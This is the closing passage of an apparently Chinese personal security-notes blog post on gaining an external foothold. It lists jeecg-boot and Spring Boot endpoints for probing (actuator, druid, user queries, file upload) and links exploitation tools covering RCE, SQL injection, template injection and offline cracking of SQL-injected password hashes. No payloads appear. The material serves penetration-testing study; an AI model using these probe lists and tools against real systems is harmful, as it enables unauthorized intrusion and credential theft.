+<p>在文章<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/436956.html%E7%9A%84%E7%BB%93%E5%B0%BE%EF%BC%8C%E8%BF%99%E4%BD%8D%E8%80%81%E5%B8%88%E8%BF%98%E7%BB%99%E5%87%BA%E4%BA%86%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84jeecg-boot%E6%8E%A5%E5%8F%A3%E5%92%8C%E5%B8%B8%E8%A7%81%E7%9A%84jeecg-boot%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7">https://www.freebuf.com/articles/web/436956.html的结尾，这位老师还给出了一些常见的jeecg-boot接口和常见的jeecg-boot漏洞利用工具</a></p>
+<h3 id="jeecg-boot接口"><a class="anchor" href="#jeecg-boot接口">#</a> jeecg-boot接口</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/v2/api-docs</span></span>
+<span class="line"><span>/jeecg-boot/online/cgform/head/fileTree?_t=1632524014&#x26;parentPath=/</span></span>
+<span class="line"><span>/jeecg-boot/sys/user/querySysUser?username=admin</span></span>
+<span class="line"><span>/jeecg/</span></span>
+<span class="line"><span>/api/sys/</span></span>
+<span class="line"><span>/sys/user</span></span>
+<span class="line"><span>/v2/api-docs</span></span>
+<span class="line"><span>/swagger-ui.html</span></span>
+<span class="line"><span>/env</span></span>
+<span class="line"><span>/actuator</span></span>
+<span class="line"><span>/mappings</span></span>
+<span class="line"><span>/metrics</span></span>
+<span class="line"><span>/beans</span></span>
+<span class="line"><span>/configprops</span></span>
+<span class="line"><span>/actuator/metrics</span></span>
+<span class="line"><span>/actuator/mappings</span></span>
+<span class="line"><span>/actuator/beans</span></span>
+<span class="line"><span>/actuator/configprops</span></span>
+<span class="line"><span>/actuator/httptrace</span></span>
+<span class="line"><span>/druid/index.html</span></span>
+<span class="line"><span>/druid/sql.html</span></span>
+<span class="line"><span>/druid/weburi.html</span></span>
+<span class="line"><span>/druid/websession.html</span></span>
+<span class="line"><span>/druid/weburi.json</span></span>
+<span class="line"><span>/druid/websession.json</span></span>
+<span class="line"><span>/druid/login.html</span></span>
+<span class="line"><span>/api/config/list</span></span>
+<span class="line"><span>/sys/user/list</span></span>
+<span class="line"><span>/sys/user/add</span></span>
+<span class="line"><span>/sys/user/edit</span></span>
+<span class="line"><span>/sys/user/queryById</span></span>
+<span class="line"><span>/sys/user/changePassword</span></span>
+<span class="line"><span>/sys/role/list</span></span>
+<span class="line"><span>/sys/role/add</span></span>
+<span class="line"><span>/sys/role/edit</span></span>
+<span class="line"><span>/sys/role/queryPermission</span></span>
+<span class="line"><span>/v2/api-docs</span></span>
+<span class="line"><span>/v1/api-docs</span></span>
+<span class="line"><span>/api-docs</span></span>
+<span class="line"><span>/sys/menu/list</span></span>
+<span class="line"><span>/sys/menu/add</span></span>
+<span class="line"><span>/sys/menu/edit</span></span>
+<span class="line"><span>/sys/menu/delete</span></span>
+<span class="line"><span>/sys/depart/list</span></span>
+<span class="line"><span>/sys/depart/add</span></span>
+<span class="line"><span>/sys/depart/edit</span></span>
+<span class="line"><span>/sys/depart/delete</span></span>
+<span class="line"><span>/online/cgform/list</span></span>
+<span class="line"><span>/online/cgform/add</span></span>
+<span class="line"><span>/online/cgform/edit</span></span>
+<span class="line"><span>/online/cgform/delete</span></span>
+<span class="line"><span>/online/cgform/fields/&#123;tableName&#125;</span></span>
+<span class="line"><span>/online/cgform/table/list</span></span>
+<span class="line"><span>/online/cgform/table/sync</span></span>
+<span class="line"><span>/online/cgform/generateCode</span></span>
+<span class="line"><span>/sys/dict/list</span></span>
+<span class="line"><span>/sys/dict/add</span></span>
+<span class="line"><span>/sys/dict/edit</span></span>
+<span class="line"><span>/sys/dict/delete</span></span>
+<span class="line"><span>/act/process/list</span></span>
+<span class="line"><span>/act/process/deploy</span></span>
+<span class="line"><span>/act/task/list</span></span>
+<span class="line"><span>/act/task/complete</span></span>
+<span class="line"><span>/act/task/history</span></span>
+<span class="line"><span>/sys/common/upload</span></span>
+<span class="line"><span>/sys/common/download/&#123;fileId&#125;</span></span>
+<span class="line"><span>/sys/common/view/&#123;fileId&#125;</span></span>
+<span class="line"><span>/monitor/redis/info</span></span>
+<span class="line"><span>/monitor/server/info</span></span>
+<span class="line"><span>/api/test/demo/list</span></span>
+<span class="line"><span>/api/test/demo/add</span></span>
+<span class="line"><span>/sys/log/list</span></span>
+<span class="line"><span>/sys/log/delete</span></span>
+<span class="line"><span>/sys/sms/send</span></span>
+<span class="line"><span>/sys/sms/list</span></span>
+<span class="line"><span>/api/test/demo/edit</span></span>
+<span class="line"><span>/api/test/demo/delete</span></span>
+<span class="line"><span>/report/loadReport/&#123;code&#125;</span></span>
+<span class="line"><span>/chart/api/getChartData</span></span>
+<span class="line"><span>/api/test/demo/queryById</span></span>
+<span class="line"><span>/act/process/delete</span></span>
+<span class="line"><span>/sys/dict/loadDictItems/&#123;dictCode&#125;</span></span>
+<span class="line"><span>/jeecg-boot/sys/getLoginQrcode</span></span>
+<span class="line"><span>/jeecg-boot/sys/getQrcodeToken</span></span>
+<span class="line"><span>/jeecg-boot/sys/login</span></span>
+<span class="line"><span>/jeecg-boot/sys/phoneLogin</span></span>
+<span class="line"><span>/jeecg-boot/sys/scanLoginQrcode</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDataSource/add</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDataSource/delete</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDataSource/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDataSource/edit</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDataSource/list</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDataSource/queryById</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetHead/add</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetHead/addGroup</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetHead/delDragDataSetHeadGroup</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetHead/delete</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetHead/edit</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetHead/queryById</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetHead/updateGroup</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetParam/add</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetParam/delete</span></span>
+<span class="line"><span>/jeecg-boot/druid/login.html</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetParam/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetParam/edit</span></span>
+<span class="line"><span>/jeecg-boot/actuator/httptrace</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetParam/list</span></span>
+<span class="line"><span>/jeecg-boot/drag/onlDragDatasetParam/queryById</span></span>
+<span class="line"><span>/jeecg-boot/drag/websocket/sendData</span></span>
+<span class="line"><span>/jeecg-boot/sys/checkRule/add</span></span>
+<span class="line"><span>/jeecg-boot/sys/checkRule/checkByCode</span></span>
+<span class="line"><span>/jeecg-boot/sys/checkRule/delete</span></span>
+<span class="line"><span>/jeecg-boot/sys/checkRule/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/sys/checkRule/edit</span></span>
+<span class="line"><span>/jeecg-boot/sys/checkRule/list</span></span>
+<span class="line"><span>/jeecg-boot/sys/checkRule/queryById</span></span>
+<span class="line"><span>/jeecg-boot/sys/comment/add</span></span>
+<span class="line"><span>/jeecg-boot/sys/comment/addFile</span></span>
+<span class="line"><span>/jeecg-boot/sys/comment/addText</span></span>
+<span class="line"><span>/jeecg-boot/sys/comment/delete</span></span>
+<span class="line"><span>/jeecg-boot/sys/comment/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/sys/comment/deleteOne</span></span>
+<span class="line"><span>/jeecg-boot/sys/comment/edit</span></span>
+<span class="line"><span>/jeecg-boot/sys/comment/fileList</span></span>
+<span class="line"><span>/jeecg-boot/sys/comment/list</span></span>
+<span class="line"><span>/jeecg-boot/sys/comment/listByForm</span></span>
+<span class="line"><span>/jeecg-boot/sys/comment/queryById</span></span>
+<span class="line"><span>/jeecg-boot/sys/dataSource/add</span></span>
+<span class="line"><span>/jeecg-boot/sys/dataSource/delete</span></span>
+<span class="line"><span>/jeecg-boot/sys/dataSource/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/sys/dataSource/edit</span></span>
+<span class="line"><span>/jeecg-boot/sys/dataSource/list</span></span>
+<span class="line"><span>/jeecg-boot/sys/dataSource/queryById</span></span>
+<span class="line"><span>/jeecg-boot/sys/dictItem/dictItemCheck</span></span>
+<span class="line"><span>/jeecg-boot/sys/duplicate/check</span></span>
+<span class="line"><span>/jeecg-boot/sys/files/add</span></span>
+<span class="line"><span>/jeecg-boot/sys/files/delete</span></span>
+<span class="line"><span>/jeecg-boot/sys/files/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/sys/files/edit</span></span>
+<span class="line"><span>/jeecg-boot/sys/files/list</span></span>
+<span class="line"><span>/jeecg-boot/sys/files/queryById</span></span>
+<span class="line"><span>/jeecg-boot/sys/fillRule/add</span></span>
+<span class="line"><span>/jeecg-boot/sys/fillRule/delete</span></span>
+<span class="line"><span>/jeecg-boot/sys/fillRule/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/sys/fillRule/edit</span></span>
+<span class="line"><span>/jeecg-boot/sys/fillRule/list</span></span>
+<span class="line"><span>/jeecg-boot/sys/fillRule/queryById</span></span>
+<span class="line"><span>/jeecg-boot/sys/formFile/add</span></span>
+<span class="line"><span>/jeecg-boot/sys/formFile/delete</span></span>
+<span class="line"><span>/jeecg-boot/sys/formFile/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/sys/formFile/edit</span></span>
+<span class="line"><span>/jeecg-boot/sys/formFile/list</span></span>
+<span class="line"><span>/jeecg-boot/sys/formFile/queryById</span></span>
+<span class="line"><span>/jeecg-boot/sys/position/add</span></span>
+<span class="line"><span>/jeecg-boot/sys/position/delete</span></span>
+<span class="line"><span>/jeecg-boot/sys/position/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/sys/position/edit</span></span>
+<span class="line"><span>/jeecg-boot/sys/position/list</span></span>
+<span class="line"><span>/jeecg-boot/sys/position/queryByCode</span></span>
+<span class="line"><span>/jeecg-boot/sys/position/queryById</span></span>
+<span class="line"><span>/jeecg-boot/sys/quartzJob/pause</span></span>
+<span class="line"><span>/jeecg-boot/sys/quartzJob/resume</span></span>
+<span class="line"><span>/jeecg-boot/sys/randomImage/</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysDepartPermission/add</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysDepartPermission/delete</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysDepartPermission/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysDepartPermission/edit</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysDepartPermission/list</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysDepartPermission/queryById</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysDepartRole/add</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysDepartRole/delete</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysDepartRole/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysDepartRole/edit</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysDepartRole/list</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysDepartRole/queryById</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysRoleIndex/add</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysRoleIndex/delete</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysRoleIndex/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysRoleIndex/edit</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysRoleIndex/list</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysRoleIndex/queryByCode</span></span>
+<span class="line"><span>/jeecg-boot/sys/sysRoleIndex/queryById</span></span>
+<span class="line"><span>/jeecg-boot/test/dynamic/test1</span></span>
+<span class="line"><span>/jeecg-boot/test/jeecgDemo/add</span></span>
+<span class="line"><span>/jeecg-boot/test/jeecgDemo/delete</span></span>
+<span class="line"><span>/jeecg-boot/test/jeecgDemo/deleteBatch</span></span>
+<span class="line"><span>/jeecg-boot/test/jeecgDemo/edit</span></span>
+<span class="line"><span>/jeecg-boot/test/jeecgDemo/list</span></span>
+<span class="line"><span>/jeecg-boot/test/jeecgDemo/queryById</span></span>
+<span class="line"><span>/sys/user/delete</span></span>
+<span class="line"><span>/jeecg-boot/sys/user/addSysUserRole</span></span>
+<span class="line"><span>/sys/role/delete</span></span>
+<span class="line"><span>/user/register</span></span></code></pre>
+<h3 id="漏洞利用工具"><a class="anchor" href="#漏洞利用工具">#</a> 漏洞利用工具</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>https://github.com/Framework-vulnerability-tool/jeecg</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>工具介绍</span></span>
+<span class="line"><span>jeecg综合漏洞利用工具,程序采用javafx开发,环境JDK 1.8 声明：仅用于授权测试，用户滥用造成的一切后果和作者无关 请遵守法律法规！ 漏洞收录如下：</span></span>
+<span class="line"><span>jeecg-boot queryFieldBySql远程命令执行漏洞</span></span>
+<span class="line"><span>jeecg-boot testConnection远程命令执行漏洞</span></span>
+<span class="line"><span>JeecgBoot jmreport/loadTableData SSTI模板注入漏洞</span></span>
+<span class="line"><span>jeecg-boot-queryTableData-sqli注入漏洞</span></span>
+<span class="line"><span>jeecg-boot-getDictItemsByTable-sqli注入漏洞</span></span>
+<span class="line"><span>Jeecg-Boot qurestSql-SQL注入漏洞</span></span>
+<span class="line"><span>jeecg-boot commonController 任意文件上传漏洞</span></span>
+<span class="line"><span>jeecg-boot jmreport任意文件上传漏洞</span></span>
+<span class="line"><span>jeecg-boot-querySysUser信息泄露漏洞</span></span>
+<span class="line"><span>jeecg-boot-checkOnlyUser信息泄露漏洞</span></span>
+<span class="line"><span>jeecg-boot-httptrace信息泄露漏洞</span></span>
+<span class="line"><span>jeecg-boot-任意文件下载漏洞</span></span>
+<span class="line"><span>jeecg-boot-jeecgFormDemoController漏洞</span></span>
+<span class="line"><span>jeecg-boot-v2 P3 Biz Chat任意文件读取漏洞</span></span>
+<span class="line"><span>jeecg-boot-v2 sys/duplicate/check注入漏洞</span></span>
+<span class="line"><span>jeecg-boot-v2 AviatorScript表达式注入漏洞</span></span></code></pre>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>https://github.com/ssrsec/JeecgBoot-offline-brute</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>有sqli的端点，但是无法rce以及进一步获得权限，我们可以尝试通过sqli获取凭据从而获得用户级权限</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>数据库中password字段是加密的，通过查看源码发现密码使用PBE进行加密，关键是用明文密码作为对称加密key的一个环节，所以没办法直接逆向解密，但是可以离线爆破。</span></span></code></pre>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-06-30 21:32:03" itemprop="dateModified" datetime="2026-06-30T21:32:03+08:00">2026-06-30</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ZLARYY<i class="ic i-at"><em>@</em></i>欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~</li><li class="link"><strong>本文链接：</strong><a href="https://zlaryy.top/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/" title="常规外网打点">https://zlaryy.top/2026/05/19/常规外网打点/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/04/23/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="prev" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture3.webp" title="信息搜集"><span class="type">上一篇</span><h3>信息搜集</h3></a></div><div class="item right"><a href="/2026/05/29/%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%BA%93%E7%B1%BB%E5%9E%8B%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/" rel="next" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture4.webp" title="其他系统库类型下的SQL注入"><span class="type">下一篇</span><h3>其他系统库类型下的SQL注入</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD"><span class="toc-number">1.</span> <span class="toc-text"> 常规外网打点（持续更新中......）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#spring-boot"><span class="toc-number">2.</span> <span class="toc-text"> spring-boot</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#actuator%E6%B3%84%E9%9C%B2"><span class="toc-number">2.1.</span> <span class="toc-text"> actuator泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x%E7%89%88%E6%9C%AC"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 1.x版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2x%E7%89%88%E6%9C%AC"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 2.x版本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#heapdump"><span class="toc-number">2.1.2.1.</span> <span class="toc-text"> heapdump</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jolokia"><span class="toc-number">2.1.2.2.</span> <span class="toc-text"> jolokia</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9B%B8%E5%85%B3%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 绕过waf的一些相关方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.2.</span> <span class="toc-text"> 实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vps"><span class="toc-number">2.2.1.</span> <span class="toc-text"> VPS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#struts"><span class="toc-number">3.</span> <span class="toc-text"> struts</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ognl"><span class="toc-number">3.1.</span> <span class="toc-text"> OGNL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-001cve-2007-4556"><span class="toc-number">3.2.</span> <span class="toc-text"> S2-001（CVE-2007-4556）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-003"><span class="toc-number">3.3.</span> <span class="toc-text"> S2-003</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-005cve-2010-1870"><span class="toc-number">3.4.</span> <span class="toc-text"> S2-005（CVE-2010-1870）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-007"><span class="toc-number">3.5.</span> <span class="toc-text"> S2-007</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-008cve-2012-0391"><span class="toc-number">3.6.</span> <span class="toc-text"> S2-008（CVE-2012-0391）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-009cve-2011-3923"><span class="toc-number">3.7.</span> <span class="toc-text"> S2-009（CVE-2011-3923）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-012"><span class="toc-number">3.8.</span> <span class="toc-text"> S2-012</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-013s2-014"><span class="toc-number">3.9.</span> <span class="toc-text"> S2-013&#x2F;S2-014</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-015"><span class="toc-number">3.10.</span> <span class="toc-text"> S2-015</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-016"><span class="toc-number">3.11.</span> <span class="toc-text"> S2-016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-019"><span class="toc-number">3.12.</span> <span class="toc-text"> S2-019</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-032cve-2016-3081"><span class="toc-number">3.13.</span> <span class="toc-text"> S2-032（CVE-2016-3081）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jeecg-boot"><span class="toc-number">4.</span> <span class="toc-text"> jeecg-boot</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.1.</span> <span class="toc-text"> 常见弱口令漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecgboot-passwordchange%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">4.2.</span> <span class="toc-text"> JeecgBoot passwordChange接口任意用户密码重置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-boot-checkonlyuser%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.</span> <span class="toc-text"> jeecg-boot-checkOnlyUser信息泄露漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-boot-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.4.</span> <span class="toc-text"> jeecg-boot-目录遍历漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-boot-344-sysdictquerytabledata-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.</span> <span class="toc-text"> Jeecg-boot 3.4.4 &#x2F;sys&#x2F;dict&#x2F;queryTableData SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecgboot-onldragdatasetheadgettotaldata-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">4.6.</span> <span class="toc-text"> JeecgBoot onlDragDatasetHead&#x2F;getTotalData SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-boot-getdictitemsbytable-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.7.</span> <span class="toc-text"> jeecg-boot-getDictItemsByTable SQL注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-boot-jmreportshow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.8.</span> <span class="toc-text"> Jeecg-Boot &#x2F;jmreport&#x2F;show SQL注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-boot-sysduplicatecheck-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">4.9.</span> <span class="toc-text"> jeecg-boot sys&#x2F;duplicate&#x2F;check SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecgboot-jmreportloadtabledata-ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.10.</span> <span class="toc-text"> JeecgBoot jmreport&#x2F;loadTableData SSTI模板注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecgboot-aviatorscript%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">4.11.</span> <span class="toc-text"> JeecgBoot AviatorScript表达式注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-boot%E5%90%8E%E5%8F%B0sysmessagetemplatesendmsg%E6%8E%A5%E5%8F%A3freemaker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">4.12.</span> <span class="toc-text"> jeecg-boot后台&#x2F;sysMessageTemplate&#x2F;sendMsg接口FreeMaker模板注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-jeecgformdemocontroller%E5%AD%98%E5%9C%A8jndi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.13.</span> <span class="toc-text"> Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-bootjmreportupload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.14.</span> <span class="toc-text"> jeecg-boot&#x2F;jmreport&#x2F;upload接口存在未授权任意文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-commoncontrollerdo%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.15.</span> <span class="toc-text"> Jeecg-commonController.do文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84jeecg-boot%E6%8E%A5%E5%8F%A3%E4%B8%8E%E5%B8%B8%E8%A7%81%E7%9A%84jeecg-boot%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">4.16.</span> <span class="toc-text"> 常见的jeecg-boot接口与常见的jeecg-boot漏洞利用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jeecg-boot%E6%8E%A5%E5%8F%A3"><span class="toc-number">4.16.1.</span> <span class="toc-text"> jeecg-boot接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">4.16.2.</span> <span class="toc-text"> 漏洞利用工具</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ZLARYY" src="/assets/avertar.png"/><p class="name" itemprop="name">ZLARYY</p><div class="description" itemprop="description">Web安全 / CTF / 个人学习笔记</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">16</span><span class="name">文章</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/ZLARYY123" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;ZLARYY123"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/essay/" rel="section"><i class="ic i-calendar"></i>essay</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2026/05/29/%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%BA%93%E7%B1%BB%E5%9E%8B%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/04/23/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/19/Linux%E6%8F%90%E6%9D%83/">Linux提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/12/SSRF/">SSRF</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/28/RCE/">RCE</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/05/29/%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%BA%93%E7%B1%BB%E5%9E%8B%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">其他系统库类型下的SQL注入</a></span></li><li class="item"><div class="breadcrumb"></div><span><a 